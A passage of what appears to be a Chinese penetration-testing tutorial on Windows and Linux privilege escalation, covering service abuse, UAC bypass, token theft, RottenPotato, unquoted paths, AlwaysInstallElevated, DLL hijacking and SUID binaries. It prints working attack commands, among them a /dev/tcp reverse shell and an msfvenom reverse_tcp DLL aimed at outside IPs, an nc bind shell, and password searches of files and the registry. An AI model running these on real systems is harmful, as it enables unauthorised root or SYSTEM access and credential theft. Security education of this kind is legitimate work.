+<p>3.System： 系统权限。可以对 sam 等敏感文件进行读取，往往需要将 administrator 权限提升到 system 权限才可以对散列值进行 DUmp 操作</p>
+<p>4.TrustedInstaller：window 中的最高权限，对系统文件，即将拥有 system 权限也无法进行获取散列值、安装软件、修改防火墙规则、修改注册表等</p>
+<h3 id="2-流程"><a class="markdownIt-Anchor" href="#2-流程">#</a> 2 流程</h3>
+<p>检查用户</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>whoami/groups</pre></td></tr></tbody></table></figure><p>查看目标机器补丁</p>
+<pre><code>systeminfo
+wmic qfe get Caption,Description ,HotFixID,InstalledOn
+</code></pre>
+<p>msf 渗透扫描</p>
+<pre><code>post/windows/gather/enum_patches
+</code></pre>
+<h3 id="3-at命令利用-windows2000-windows-2003-windows-xp"><a class="markdownIt-Anchor" href="#3-at命令利用-windows2000-windows-2003-windows-xp">#</a> 3 at 命令利用 Windows2000、Windows 2003、Windows XP</h3>
+<p>​		在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用 at 命令将权限提升至 system 权限。</p>
+<p>AT 命令是 Windows XP 中内置的命令，它也可以媲美 Windows 中的 "计划任务"，而且在计划的安排、任务的管理、工作事务的处理方面，AT 命令具有更强大更神通的功能。AT 命令可在指定时间和日期、在指定计算机上运行命令和程序。</p>
+<p>因为 at 命令默认是以 system 权限下运行的所以我们可以利用以下命令，进行提权。</p>
+<p>at 时间 /interactive cmd 其中里面的 /interactive 参数是开启交互模式</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165344444-1263387316.webp" alt="img"></p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165345724-1823083219.webp" alt="img"></p>
+<p>可以看到已经启动了一个 system 权限下的 cmd 窗口，虽然此时我们已经有了 system 的权限，但是可以看到，桌面还是之前用户的权限所启动的<img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165346188-456697944.webp" alt="img"></p>
+<p>为了完全提权，我们可以在 system 的 cmd 里面输入 taskmgr.exe 来启动任务管理器</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165346621-908976883.webp" alt="img"></p>
+<p>在任务管理器里面我们结束掉之前由之前账号开启的桌面进程</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165347188-2031860445.webp" alt="img"></p>
+<p>然后再添加一个由 system 权限下开启的桌面进程</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165347529-1439309872.webp" alt="img"></p>
+<p>再点入看现在登入的账号是</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348118-1951026428.webp" alt="img"></p>
+<p>或者利用 msf 生成木马在利用 at 启动</p>
+<h3 id="4-sc命令利用-windows-78-0308-1216"><a class="markdownIt-Anchor" href="#4-sc命令利用-windows-78-0308-1216">#</a> 4 sc 命令利用 windows 7/8、03/08、12/16</h3>
+<p>适用于 windows 7/8、03/08、12/16</p>
+<p>因为 at 命令在 win7，win8 等更高版本的系统上都已经取消掉了，所以在一些更高版本的 windows 操作系统上我们可以用 sc 命令进行提权</p>
+<p>SC 命令是 XP 系统中功能强大的 DOS 命令，SC 命令能与 "服务控制器" 和已安装设备进行通讯。SC 是用于与服务控制管理器和服务进行通信的命令行程序。</p>
+<p>通俗理解就是 sc 可以启动一个服务，命令如下。</p>
+<pre><code>sc Create systemcmd binPath= "cmd /K start" type= own type= interact
+</code></pre>
+<p>其中 systemcmd 是服务名称，大家可以随意填写，binpath 是启动的命令，type=own 是指服务这个服务属于谁，type=interact。这里再解释一下 cmd/k start 这个命令，这个命令就是启动一个新的 cmd 窗口，如图。</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348548-2040451659.webp" alt="img"></p>
+<p>我们继续回车</p>
+<p>上面的命令。</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348917-255228848.webp" alt="img"></p>
+<pre><code>sc start systemcmd
+</code></pre>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349331-1015014567.webp" alt="img"></p>
+<p>因为 sc 启动服务也是默认 system 权限的，所以我们启动的 cmd 窗口也是 system 权限！接下来的操作就可以和 xp，2003 一样了，这里就不在重复了。</p>
+<h3 id="5-psexec提权-win2003-win2008"><a class="markdownIt-Anchor" href="#5-psexec提权-win2003-win2008">#</a> 5 psexec 提权 Win2003、Win2008</h3>
+<p>适用版本：Win2003 &amp; Win2008</p>
+<pre><code>psexec.exe -accepteula -s -i -d cmd.exe
+</code></pre>
+<p>开启的 cmd 窗口也是 system 权限</p>
+<h3 id="6-绕过uac提权-microsoft的windows-vista-windows-server-2008"><a class="markdownIt-Anchor" href="#6-绕过uac提权-microsoft的windows-vista-windows-server-2008">#</a> 6 绕过 UAC 提权 Microsoft 的 Windows Vista、Windows Server 2008</h3>
+<h5 id="1简介"><a class="markdownIt-Anchor" href="#1简介">#</a> （1）简介</h5>
+<p>​		Microsoft 的 Windows Vista 和 Windows Server 2008 操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。</p>
+<p>​		换句话说，它是 Windows 的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC 确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且 Windows 系统保持不变。</p>
+<p>​		UAC 通过阻止程序执行任何涉及有关系统更改 / 特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被 "提升权限"，而不是以管理员身份运行的程序。</p>
+<p>​		UAC 不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件。这同样取决于用户。如果将以管理员权限执行程序，则将提醒用户并且需要用户确认。</p>
+<h5 id="2绕过方法"><a class="markdownIt-Anchor" href="#2绕过方法">#</a> （2）绕过方法</h5>
+<p>通过 msf 拿到 meterprter 的会话后，我们可以通过 getsystem 或者 getuid 来检查是否是 system 权限</p>
+<p>如果不是 system 权限，我们可以通过以下绕过 UAC 模块对 UAC 进行绕过，在通过 getsystem 进行提权</p>
+<pre><code>exploit/windows/local/ask #弹出UAC确认窗口，点击后获得system权限
+exploit/windows/local/bypassuac
+exploit/windows/local/bypassuac_injection
+exploit/windows/local/bypassuac_fodhelper
+exploit/windows/local/bypassuac_eventvwr
+exploit/windows/local/bypassuac_comhijack
+</code></pre>
+<h3 id="7-令牌窃取-2008及以前"><a class="markdownIt-Anchor" href="#7-令牌窃取-2008及以前">#</a> 7 令牌窃取 2008 及以前</h3>
+<h5 id="令牌简介"><a class="markdownIt-Anchor" href="#令牌简介">#</a> 令牌简介</h5>
+<p>​		描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个 Access Token，这个 Token 在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了 A 用户创建一个进程而该进程没有 B 用户的权限。一般用户双击运行一个进程都会拷贝 explorer.exe 的 Access Token。访问令牌分为：</p>
+<ul>
+<li>
+<p>授权令牌（Delegation token）：交互式会话登陆（例：本地用户登陆、用户桌面等）</p>
+</li>
+<li>
+<p>模拟令牌（Impersonation token）：非交互式登陆（例：net use 访问共享文件）</p>
+</li>
+</ul>
+<p>两种 token 只有在系统重启后才会清除；授权令牌在用户注销后，该令牌会变为模拟令牌依旧有效。</p>
+<p>​		同样也可以这样理解，当前系统中的某个进程或线程能访问到什么样的系统资源，完全取决于你当前进程是拿着谁的令牌。</p>
+<p>​		默认情况下，我们列举令牌，只能列举出当前用户和比当前用户权限更低用户的令牌。令牌的数量取决于当前 shell 的访问级别，如果当前的 shell 是 administrator 或者是 system，我们就可以看到系统中的所有的令牌。</p>
+<h5 id="攻击方法"><a class="markdownIt-Anchor" href="#攻击方法">#</a> 攻击方法</h5>
+<p>首先提前获取一个 session</p>
+<pre><code>meterpreter &gt; use incognito
+
+meterpreter &gt; list_tokens -u
+
+meterpreter &gt; impersonate_token WIN-2HU3N1\\Administrator **#注意：这里是两个反斜杠\\**
+</code></pre>
+<h3 id="8-烂土豆提权-web权限"><a class="markdownIt-Anchor" href="#8-烂土豆提权-web权限">#</a> 8 烂土豆提权 web 权限</h3>
+<h4 id="原理"><a class="markdownIt-Anchor" href="#原理">#</a> 原理</h4>
+<ul>
+<li>欺骗 "NT AUTHORITY\SYSTEM" 账户通过 NTLM 认证到我们控制的 TCP 终端。</li>
+<li>对这个认证过程使用中间人攻击（NTLM 重放），为 "NT AUTHORITY\SYSTEM" 账户本地协商一个安全令牌。这个过程是通过一系列的 Windows API 调用实现的。</li>
+<li>模仿这个令牌。只有具有 "模仿安全令牌权限" 的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL 等）有这个权限，大多数用户级的账户没有这个权限。</li>
+</ul>
+<p>​		所以，一般从 web 拿到的 webshell 都是 IIS 服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹 meterpreter 然后再去执行 EXP 的时候会失败，但使用菜刀（IIS 服务器权限）反弹 meterpreter 就会成功。</p>
+<h4 id="攻击方法-2"><a class="markdownIt-Anchor" href="#攻击方法-2">#</a> 攻击方法</h4>
+<pre><code>meterpreter &gt; upload /root/Rottenpotato/rottenpotato.exe
+
+meterpreter &gt; execute -HC -f rottenpotato.exe
+
+meterpreter &gt; use incognito
+
+meterpreter &gt; list_tokens -u
+</code></pre>
+<p>会发现令牌列表里面存在 system 的令牌，在用 system 的令牌进行提权</p>
+<p><strong>烂土豆版本</strong></p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></li>
+</ol>
+<h3 id="9-可信任服务路径漏洞"><a class="markdownIt-Anchor" href="#9-可信任服务路径漏洞">#</a> 9 可信任服务路径漏洞</h3>
+<p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的</p>
+<p><strong>漏洞原理</strong></p>
+<p>这里假设有一个服务路径 C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe</p>
+<ol>
+<li>带引号时："C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe" 会被看成一个完整的服务路径，故不会产生漏洞。</li>
+<li>不带引号时：我们认为的服务路径是 C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe，但是由于没有双引号的包裹，Windows 会认为 C:\Program 空格后面的为 Program 这个程序的参数来进行启动服务。这样攻击者就可以命名一个为 Program.exe 的后门文件放在 c 盘下，进而等待含漏洞服务路径的启动或重启导致后门文件的执行。</li>
+</ol>
+<p><strong>攻击方法</strong></p>
+<p>#寻找存在漏洞的服务</p>
+<pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+</code></pre>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349775-559246082.webp" alt="img"></p>
+<p>把我们后门文件重命名放在对应的文件路径下</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350108-1640161384.webp" alt="img"></p>
+<p>在 msf 上进行监听，然后启动对应服务</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350469-809846620.webp" alt="img"></p>
+<p>接收到 shell，且是 system 权限</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350841-1807683012.webp" alt="img"></p>
+<p>msf 检测攻击模块</p>
+<pre><code>exploit/windows/local/unquoted_service_path
+</code></pre>
+<p>正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程</p>
+<pre><code>set AutoRunScript migrate -f
+</code></pre>
+<h3 id="10-不安全服务权限配合计划任务schtasks或sc命令利用"><a class="markdownIt-Anchor" href="#10-不安全服务权限配合计划任务schtasks或sc命令利用">#</a> 10 不安全服务权限配合计划任务 schtasks 或 SC 命令利用</h3>
+<p>​		如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用覆盖原来的服务路径，进而启动我们的恶意程序。（一般用来 administrator 提权到 system，因为普通用户用 sc 修改服务路径会没有权限，导致不能用该方法提权。）</p>
+<p>accesschk.exe -uwcqv “administrators” * #检查 administrators 组的权限配置（这里自己创建了一个 test 服务）</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351169-1682951443.webp" alt="img"></p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351505-495496718.webp" alt="img"></p>
+<p>sc config “test” binpath=“C:\shell.exe” #用 sc 命令修改服务对应路径</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351871-824825594.webp" alt="img"></p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352226-1488097995.webp" alt="img"></p>
+<p>sc start test #然后我们在 msf 监听，在启动该服务，就可以接收到我们的 shell</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352599-1121177084.webp" alt="img"></p>
+<p>当然还可以用 schtasks 来定时启动服务，schtasks 命令比 at 命令更灵活。而且在 Windows Vista、Windows Server 2008 及之后版本的操作系统已经弃用 at 命令。</p>
+<p>#查看计算机的计划任务</p>
+<pre><code>schtasks /query /fo LIST /v
+schtasks /create /s 10.10.10.80 /tn test /sc onstart /tr c:\artifact.exe /ru system /f
+</code></pre>
+<p>在远程主机运行 "test" 任务</p>
+<pre><code>schtasks /run /s 10.10.10.80 /i /tn "test"
+</code></pre>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352923-1541900357.webp" alt="img"></p>
+<p>执行完成之后就删除计划任务</p>
+<pre><code>schtasks /delete /s 10.10.10.80 /tn "test" /f
+</code></pre>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353205-57489983.webp" alt="img"></p>
+<p>接着删除 IPC</p>
+<pre><code>net use \\10.10.10.80 /del /y
+</code></pre>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353471-1410299606.webp" alt="img"></p>
+<p>在使用 schtasks 命令的时候会在系统留下日志文件 C:WindowsTasksSchedLgU.txt。</p>
+<p><strong>参数：</strong></p>
+<pre><code>/create 表示创建计划任务
+
+/tn 表示任务名
+
+/tr 指定运行的文件
+
+/sc 是任务运行频率
+
+/st 是执行时间
+
+/s 指定远程机器名或 ip 地址
+
+/ru 指定运行任务的用户权限，这里指定为最高的 SYSTEM
+
+/i 表示立即运行
+
+/F 表示如果指定的任务已经存在，则强制创建任务并抑制警告
+
+/delete 是删除任务。
+</code></pre>
+<h3 id="10-unattended-installs自动安装"><a class="markdownIt-Anchor" href="#10-unattended-installs自动安装">#</a> 10 Unattended Installs（自动安装）</h3>
+<p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为 Unattend 的 XML 文件残存在系统上。 这个 XML 文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>
+<p>全盘搜索 Unattend 文件是个好办法，它通常会在以下一个文件夹中：</p>
+<p>Copy</p>
+<p>C:\Windows\Panther<br>
+C:\Windows\Panther\Unattend<br>
+C:\Windows\System32<br>
+C:\Windows\System32\sysprep\</p>
+<p>除了 Unattend.xml 文件外，还要留意系统中的 sysprep.xml 和 sysprep.inf 文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。</p>
+<p>Copy</p>
+<p>C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c</p>
+<p>Copy</p>
+<p>#或者在名称中包含关键词的项目：<br>
+C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr <em>password</em></p>
+<p>#或者可以在文件内容中搜索 password 之类的关键字：<br>
+C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</p>
+<p>#可以查询注册表，例如，字符串 password：<br>
+reg query HKLM /f password /t REG_SZ /s<br>
+reg query HKCU /f password /t REG_SZ /s</p>
+<p>在这些文件中通常包含用户名和密码，密码使用 base64 编码，并且在最后会附加 "Password"，所以真正的密 码需要去掉最后的 "Password"。</p>
+<p>#msf 模块<br>
+ post/windows/gather/enum_unattend</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200417102207151-1260539331.png"><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353799-254963719.webp" alt="img"></a></p>
+<h3 id="11-alwaysinstallelevated"><a class="markdownIt-Anchor" href="#11-alwaysinstallelevated">#</a> 11 AlwaysInstallElevated</h3>
+<p>AlwaysInstallElevated 是一种允许非管理用户以 SYSTEM 权限运行 Microsoft Windows 安装程序包（.MSI 文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。</p>
+<p>可以通过查询以下注册表项来识别此设置：</p>
+<pre><code>[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] "AlwaysInstallElevated"=dword:00000001
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] "AlwaysInstallElevated"=dword:00000001
+</code></pre>
+<p>使用 reg query 命令查询是否存在漏洞</p>
+<pre><code>C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+or
+C:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre>
+<p>如果系统没这个漏洞，它将输出错误:</p>
+<pre><code>ERROR: The system was unable to find the specified registry key or value.
+</code></pre>
+<p>如果存在漏洞，上面将输出以下内容:</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1561366/202004/1561366-20200417101457457-373225001.png"><img src="https://img2020.cnblogs.com/blog/2096968/202108/2096968-20210819165354233-1421529420.png" alt="img"></a></p>
+<p>然后我们使用 msfvenom 生成 msi 文件，进行提权</p>
+<pre><code>msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msi
+
+msiexec /quiet /qn /i C:\programdata\rotten.msi
+</code></pre>
+<p># /quiet 安装过程中禁止向用户发送消息<br>
+# /qn 不使用 GUI<br>
+# /i 安装程序</p>
+<p>msf 下的自动模块</p>
+<pre><code>exploit/windows/local/always_install_elevated
+</code></pre>
+<h3 id="12-dll劫持提权"><a class="markdownIt-Anchor" href="#12-dll劫持提权">#</a> 12 DLL 劫持提权</h3>
+<h4 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2">#</a> 原理</h4>
+<p>Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过在应用程序要查找的位置放置恶意 DLL 来提权。通常，Windows 应用程序有其预定义好的搜索 DLL 的路径，它会根据下面的顺序进行搜索：</p>
+<p>1、应用程序加载的目录</p>
+<p>2、C:\Windows\System32</p>
+<p>3、C:\Windows\System</p>
+<p>4、C:\Windows</p>
+<p>5、当前工作目录 Current Working Directory，CWD</p>
+<p>6、在 PATH 环境变量的目录（先系统后用户）</p>
+<p>过程：信息收集 - 进程调试 - 制作 dll 并上传 - 替换 dll - 启动应用后成功</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/test.dll</p>
+<h3 id="13-常用系统漏洞-cve-windows10-windows72008-windows78-200820122016-sql-server-iis通杀-针对本地用户的不能用于域用户"><a class="markdownIt-Anchor" href="#13-常用系统漏洞-cve-windows10-windows72008-windows78-200820122016-sql-server-iis通杀-针对本地用户的不能用于域用户">#</a> 13 常用系统漏洞 CVE Windows10 Windows7/2008 Windows7/8、2008/2012/2016 SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)</h3>
+<h5 id="windows10"><a class="markdownIt-Anchor" href="#windows10">#</a> Windows10</h5>
+<p>CVE-2020-0796 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/12618678.html">https://www.cnblogs.com/-chenxs/p/12618678.html</a></p>
+<h5 id="windows72008"><a class="markdownIt-Anchor" href="#windows72008">#</a> Windows7/2008</h5>
+<p>CVE-2018-8120 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11404598.html">https://www.cnblogs.com/-mo-/p/11404598.html</a></p>
+<h5 id="windows78-200820122016"><a class="markdownIt-Anchor" href="#windows78-200820122016">#</a> Windows7/8、2008/2012/2016</h5>
+<p>CVE-2017-0213 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11446144.html">https://www.cnblogs.com/-mo-/p/11446144.html</a></p>
+<h5 id="sql-server-iis通杀-针对本地用户的不能用于域用户"><a class="markdownIt-Anchor" href="#sql-server-iis通杀-针对本地用户的不能用于域用户">#</a> SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)</h5>
+<p>MS16-075(RottenPotato) <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p>
+<h2 id="二-linux"><a class="markdownIt-Anchor" href="#二-linux">#</a> 二、linux</h2>
+<h3 id="1-suid提权"><a class="markdownIt-Anchor" href="#1-suid提权">#</a> 1 suid 提权</h3>
+<p>程序 <code>ls -l</code>  如果有个 s 位，即有 suid</p>
+<p>Ubuntu 16.04 以后，无法直接使用 SUID+ <code>system()</code>  的方式来提权，Ubuntu 发行版官方对 dash 进行了修改：<strong>当 dash 以 suid 权限运行、且没有指定 <code>-p</code>  选项时，将会丢弃 suid 权限，恢复当前用户权限</strong></p>
+<h4 id="1-找到有root权限的程序"><a class="markdownIt-Anchor" href="#1-找到有root权限的程序">#</a> （1） 找到有 root 权限的程序</h4>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-ldb</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">;</span></pre></td></tr></tbody></table></figure><h4 id="2可用于suid提权的程序"><a class="markdownIt-Anchor" href="#2可用于suid提权的程序">#</a> （2）可用于 suid 提权的程序</h4>
+<h5 id="1-nmap"><a class="markdownIt-Anchor" href="#1-nmap">#</a> ① nmap</h5>
+<ul>
+<li>较旧版本的 Nmap（2.02 至 5.21）具有交互模式</li>
+</ul>
+<p>进入交互模式：</p>
+<pre><code>nmap --interactive
+</code></pre>
+<p>提权：</p>
+<pre><code>nmap&gt; !sh
+sh-3.2# whoami
+root
+</code></pre>
+<p>msf 中的可提权模块：</p>
+<pre><code>exploit/unix/local/setuid_nmap
+</code></pre>
+<h5 id="2-find"><a class="markdownIt-Anchor" href="#2-find">#</a> ② find</h5>
+<p>提权：</p>
+<pre><code>touch anyfile #必须要有这个文件
+find anyfile -exec whoami \;
+</code></pre>
+<p>进入交互：</p>
+<pre><code>#进入shell
+find anyfile -exec '/bin/sh' \;
+sh-5.0# whoami
+root
+</code></pre>
+<p>广播 shell（出网）：</p>
+<pre><code>find user -exec nc -lvp 4444 -e '/bin/sh' \;
+</code></pre>
+<p>在攻击机：</p>
+<pre><code>nc 靶机ip 4444
+</code></pre>
+<p>反弹 shell：</p>
+<pre><code>find anyfile -exec bash -c 'bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1' \;
+</code></pre>
+<p>在攻击机：</p>
+<pre><code>nc -lvvp 4444
+</code></pre>
+<h5 id="3-vim"><a class="markdownIt-Anchor" href="#3-vim">#</a> ③ Vim</h5>
+<p>如果以 SUID 运行，它将继承 root 用户权限，可以读取系统上的所有文件</p>
+<pre><code>vim.tiny  /etc/passwd
+</code></pre>
+<p>通过 vim 进入 shell：</p>
+<pre><code>vim.tiny
+#vim命令
+:set shell = '/bin/sh'
+:shell
+</code></pre>
+<h5 id="4-bash"><a class="markdownIt-Anchor" href="#4-bash">#</a> ④ Bash</h5>
+<p>用 root 打开一个 bash shell：</p>
+<pre><code>bash -p
+bash-3.2# id
+uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
+</code></pre>
+<h5 id="5-less"><a class="markdownIt-Anchor" href="#5-less">#</a> ⑤ less</h5>
+<p>进入 shell：</p>
+<pre><code>less /etc/passwd
+#在less中输入:
+!/bin/sh
+</code></pre>
+<h5 id="6-more"><a class="markdownIt-Anchor" href="#6-more">#</a> ⑥ more</h5>
+<p>进入 shell：</p>
+<pre><code>more /etc/passwd
+#在more中输入:
+!/bin/sh
+</code></pre>
+<p>要注意的是使用 more 和 less 一定读取一个比较大的文件，如果文件太小无法进入翻页功能也就无法使用 <code>!</code>  命令进入 shell</p>
+<h5 id="7-nano"><a class="markdownIt-Anchor" href="#7-nano">#</a> ⑦ nano</h5>
+<p>进入 shell：</p>
+<pre><code>nano #进入nano编辑器
+Ctrl + R
+Ctrl + X 
+#即可输入命令
+</code></pre>
+<h5 id="8-cpmv"><a class="markdownIt-Anchor" href="#8-cpmv">#</a> ⑧ cp/mv</h5>
+<p>使用 cp 命令覆盖原来的 <code>/etc/passwd</code>  文件</p>
+<p>生成密码：（这里 abcd 为密码）</p>
+<pre><code>$ openssl passwd -1 -salt 1*2*3 abcd
+$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1
+</code></pre>
+<p>将 <code>/etc/passwd</code>  复制到当前位置进行修改</p>
+<p>底部添加：用户名：密码，如：</p>
+<pre><code>moyao:$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1:0:0:root:/root:/bin/bash
+</code></pre>
+<p>即可添加账户</p>
+<h5 id="9-awk"><a class="markdownIt-Anchor" href="#9-awk">#</a> ⑨ awk</h5>
+<p>awk 命令进入 shell：</p>
+<pre><code>awk 'BEGIN {system("/bin/bash")}'
+</code></pre>
+<h5 id="10-其它"><a class="markdownIt-Anchor" href="#10-其它">#</a> ⑩ 其它</h5>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20240513094825632.webp" alt="image-20240513094825632"></p>
+<h3 id="2-内核漏洞脏牛提权"><a class="markdownIt-Anchor" href="#2-内核漏洞脏牛提权">#</a> 2 内核漏洞脏牛提权</h3>
+<h5 id="1查看版本"><a class="markdownIt-Anchor" href="#1查看版本">#</a> （1）查看版本</h5>
+<p>查看发行版本：</p>
+<pre><code>cat /etc/issue
+
+cat /etc/*-release
+</code></pre>
+<p>查看内核版本：</p>
+<pre><code>uname -a
+</code></pre>
+<h5 id="2msf"><a class="markdownIt-Anchor" href="#2msf">#</a> （2）msf</h5>
+<p>例如：内核版本 3.2.78</p>
+<p>搜索该版本漏洞：</p>
+<pre><code>searchsploit linux 3.2.78
+</code></pre>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212041598-1644502075.webp" alt="img"></p>
+<p>找到提权脚本：</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212042016-1033310053.webp" alt="img"></p>
+<p>编译：</p>
+<pre><code>gcc -pthread 40839.c -o 40839 -lcrypt
+</code></pre>
